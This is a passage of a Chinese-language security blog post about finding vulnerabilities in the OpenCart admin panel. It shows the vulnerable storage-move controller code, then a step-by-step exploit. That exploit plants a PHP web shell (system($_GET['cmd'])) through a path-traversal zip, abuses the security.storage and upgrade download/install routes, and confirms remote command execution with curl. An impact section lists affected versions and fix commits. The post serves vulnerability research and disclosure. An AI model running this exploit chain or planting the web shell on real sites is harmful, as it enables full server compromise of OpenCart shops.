class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;[^a-zA-z0-9_]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-title function_ invoke__">html_entity_decode</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;name&#x27;</span>]), ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>)));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;path&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;[^a-zA-z0-9_\:\/]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-title function_ invoke__">html_entity_decode</span>(<span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;path&#x27;</span>]), ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$json</span> = [];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;user-&gt;<span class="hljs-title function_ invoke__">hasPermission</span>(<span class="hljs-string">&#x27;modify&#x27;</span>, <span class="hljs-string">&#x27;common/security&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$base_old</span> = DIR_STORAGE;<br>        <span class="hljs-variable">$base_new</span> = <span class="hljs-variable">$path</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$base_old</span>)) &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_storage&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$root</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$this</span>-&gt;request-&gt;server[<span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>] . <span class="hljs-string">&#x27;/../&#x27;</span>));<br><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base_new</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$root</span>)) != <span class="hljs-variable">$root</span>) || (<span class="hljs-variable">$root</span> == <span class="hljs-variable">$base_new</span>)) &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_storage&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$base_new</span>) &amp;&amp; <span class="hljs-variable">$page</span> &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_storage_exists&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_writable</span>(DIR_OPENCART . <span class="hljs-string">&#x27;config.php&#x27;</span>) || !<span class="hljs-title function_ invoke__">is_writable</span>(DIR_APPLICATION . <span class="hljs-string">&#x27;config.php&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_writable&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_permission&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$json</span>) &#123;<br>        <span class="hljs-variable">$files</span> = [];<br><br>        <span class="hljs-comment">// Make path into an array</span><br>        <span class="hljs-variable">$directory</span> = [<span class="hljs-variable">$base_old</span>];<br><br>        <span class="hljs-comment">// While the path array is still populated keep looping through</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$directory</span>) != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-variable">$next</span> = <span class="hljs-title function_ invoke__">array_shift</span>(<span class="hljs-variable">$directory</span>);<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-variable">$next</span>, <span class="hljs-string">&#x27;/&#x27;</span>) . <span class="hljs-string">&#x27;/&#123;*,.[!.]*,..?*&#125;&#x27;</span>, GLOB_BRACE) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                <span class="hljs-comment">// If directory add to path array</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                    <span class="hljs-variable">$directory</span>[] = <span class="hljs-variable">$file</span>;<br>                &#125;<br><br>                <span class="hljs-comment">// Add the file to the files to be deleted array</span><br>                <span class="hljs-variable">$files</span>[] = <span class="hljs-variable">$file</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// Create the new storage folder</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$base_new</span>)) &#123;<br>            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$base_new</span>, <span class="hljs-number">0777</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// Copy the</span><br>        <span class="hljs-variable">$total</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$files</span>);<br>        <span class="hljs-variable">$limit</span> = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-variable">$start</span> = (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$limit</span>;<br>        <span class="hljs-variable">$end</span> = <span class="hljs-variable">$start</span> &gt; (<span class="hljs-variable">$total</span> - <span class="hljs-variable">$limit</span>) ? <span class="hljs-variable">$total</span> : (<span class="hljs-variable">$start</span> + <span class="hljs-variable">$limit</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-variable">$start</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$end</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$destination</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$files</span>[<span class="hljs-variable">$i</span>], <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$base_old</span>));<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$base_old</span> . <span class="hljs-variable">$destination</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$base_new</span> . <span class="hljs-variable">$destination</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$base_new</span> . <span class="hljs-variable">$destination</span>, <span class="hljs-number">0777</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$base_old</span> . <span class="hljs-variable">$destination</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$base_new</span> . <span class="hljs-variable">$destination</span>)) &#123;<br>                <span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-variable">$base_old</span> . <span class="hljs-variable">$destination</span>, <span class="hljs-variable">$base_new</span> . <span class="hljs-variable">$destination</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$end</span> &lt; <span class="hljs-variable">$total</span>) &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;next&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;url-&gt;<span class="hljs-title function_ invoke__">link</span>(<span class="hljs-string">&#x27;common/security.storage&#x27;</span>, <span class="hljs-string">&#x27;&amp;user_token=&#x27;</span> . <span class="hljs-variable">$this</span>-&gt;session-&gt;data[<span class="hljs-string">&#x27;user_token&#x27;</span>] . <span class="hljs-string">&#x27;&amp;name=&#x27;</span> . <span class="hljs-variable">$name</span> . <span class="hljs-string">&#x27;&amp;path=&#x27;</span> . <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;&amp;page=&#x27;</span> . (<span class="hljs-variable">$page</span> + <span class="hljs-number">1</span>), <span class="hljs-literal">true</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Start deleting old storage location files.</span><br>            <span class="hljs-title function_ invoke__">rsort</span>(<span class="hljs-variable">$files</span>);<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                <span class="hljs-comment">// If file just delete</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>                &#125;<br><br>                <span class="hljs-comment">// If directory use the remove directory function</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$file</span>)) &#123;<br>                    <span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$file</span>);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-title function_ invoke__">rmdir</span>(<span class="hljs-variable">$base_old</span>);<br><br>            <span class="hljs-comment">// Modify the config files</span><br>            <span class="hljs-variable">$files</span> = [<br>                DIR_APPLICATION . <span class="hljs-string">&#x27;config.php&#x27;</span>,<br>                DIR_OPENCART . <span class="hljs-string">&#x27;config.php&#x27;</span><br>            ];<br><br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>                <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>                <span class="hljs-variable">$lines</span> = <span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$file</span>);<br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lines</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$line_id</span> =&gt; <span class="hljs-variable">$line</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$line</span>, <span class="hljs-string">&#x27;define(\&#x27;DIR_STORAGE&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>                        <span class="hljs-variable">$output</span> .= <span class="hljs-string">&#x27;define(\&#x27;DIR_STORAGE\&#x27;, \&#x27;&#x27;</span> . <span class="hljs-variable">$base_new</span> . <span class="hljs-string">&#x27;\&#x27;);&#x27;</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$output</span> .= <span class="hljs-variable">$line</span>;<br>                    &#125;<br>                &#125;<br><br>                <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br><br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$output</span>);<br><br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br><br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;success&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;text_storage_success&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;response-&gt;<span class="hljs-title function_ invoke__">addHeader</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;response-&gt;<span class="hljs-title function_ invoke__">setOutput</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$json</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><strong>Exploit</strong><br>Steps to reproduce the behavior:</p>
+<ol>
+<li><p>create the backdoor.zip and create a repo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip backdoor.zip opencart-../../../example/example_repo/releases/download/v1.0/backdoor/upload/install/backdoor.php<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>create directory <code>opencart-..</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /admin/index.php?route=common/security.storage&amp;user_token=9fce5f4ac242980e6ec62cbdd72ceff8&amp;path=/var/www/html/system/storage/download/opencart-.. HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>create directory <code>/var/www/html/system/storage/example/example_repo/releases/download/v1.0</code> like step 2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pyhon">GET /admin/index.php?route=common/security.storage&amp;user_token=9fce5f4ac242980e6ec62cbdd72ceff8&amp;path=/var/www/html/system/storage/example HTTP/1.1<br>...<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>trigger download to download the backdoor.zip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /admin/index.php?route=tool/upgrade.download&amp;user_token=9fce5f4ac242980e6ec62cbdd72ceff8&amp;version=../../../example/example_repo/releases/download/v1<span class="hljs-number">.0</span>/backdoor HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>trigger install to unzip the backdoor.zip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GET /admin/index.php?route=tool/upgrade.install&amp;user_token=9fce5f4ac242980e6ec62cbdd72ceff8&amp;version=../../../example/example_repo/releases/download/v1<span class="hljs-number">.0</span>/backdoor HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>now <code>backdoor.php</code> in <code>/var/www/html/install/</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜ curl http://192.168.254.4:8080/install/backdoor.php\?cmd\=<span class="hljs-built_in">pwd</span><br>/var/www/html/install<br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><ul>
+<li>日志清除</li>
+</ul>
+<p>存在文件清空漏洞，<a target="_blank" rel="noopener" href="https://github.com/opencart/opencart/commit/23b9d53e4c903e1a33278c199b2013f2267881cb#diff-102e09e795272ef9414f0d1affbe6e193b95d5d0bd33b9f776515b1d112e428f">23b9d53</a>引入，<a target="_blank" rel="noopener" href="https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97">0a8dd91</a>修复，影响版本4.0.0.0至最新版</p>
+<ul>
+<li>任意文件夹创建</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/opencart/opencart/commit/bc60f21aa2ece0ebfa66800e02ebe06910464953#diff-07626562ea150e132e1a0238aecd3d4c4d9514ca249b327a8538043fbab24170R13">bc60f21</a>中修复了正则匹配，导致无法创建包含<code>-</code>的文件夹，影响版本4.0.0.0至最新版</p>
+<ul>
+<li>升级包下载</li>
+</ul>
+<p>由于目录创建修复了正则匹配，无法创建包含<code>-</code>的文件夹，最新代码难以利用，影响版本4.0.0.0至最新版</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="../../../../../categories/ctp-wp/" class="category-chain-item">ctp-wp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="../../../../../tags/WEB/" class="print-no-link">#WEB</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>OpenCart漏洞挖掘</div>
+      <div>https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart漏洞挖掘/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>noxke</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月3日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-nc"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="../../../18/studay/AFL-study/" title="AFL-study">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">AFL-study</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="../../../../06/29/ctf_wp/%E7%BD%91%E5%AE%89%E5%AE%9E%E8%B7%B54-AWD/" title="网安实践4-AWD">
+                        <span class="hidden-mobile">网安实践4-AWD</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+<a target="_blank" rel="noopener" href="https://github.com/noxke"> <img src="/img/github-icon.png" srcset="/img/loading.gif" lazyload style="height: 18px;"> Github </a> <a href="mailto:zpengkee@gmail.com"> <img src="/img/email-icon.png" srcset="/img/loading.gif" lazyload style="height: 20px;"> Email </a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="../../../../../js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="../../../../../js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="../../../../../js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
